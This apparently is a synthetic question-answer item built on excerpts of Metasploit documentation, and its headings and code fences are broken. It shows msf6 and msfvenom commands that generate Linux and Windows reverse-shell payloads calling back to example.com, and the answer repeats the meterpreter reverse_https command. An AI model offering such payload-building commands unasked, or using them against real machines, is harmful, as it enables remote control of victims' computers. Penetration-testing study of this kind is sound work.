Context:### Windows common reverse shell
### Linux common reverse shell
## How to set up for a reverse shell during payload generation
### Step 1: Generate the executable payload
On the attacker's box, run `msfpayload` or `msfvenom`:
```bash
# Generate a payload for use within C
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f c

# Generate an ELF file for execution on Linux environments
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
```
$ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
```

### Tracking the UUID
Payload UUIDs are enabled by default, but are not tracked unless the
```PayloadUUIDTracking```

option is set to
```true

 Question: "Generate an example of using msfvenom to create a Windows payload with the UUID technique. The payload must use reverse_https. Your response should be a single line of Bash code." 

 Your response: 
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe
```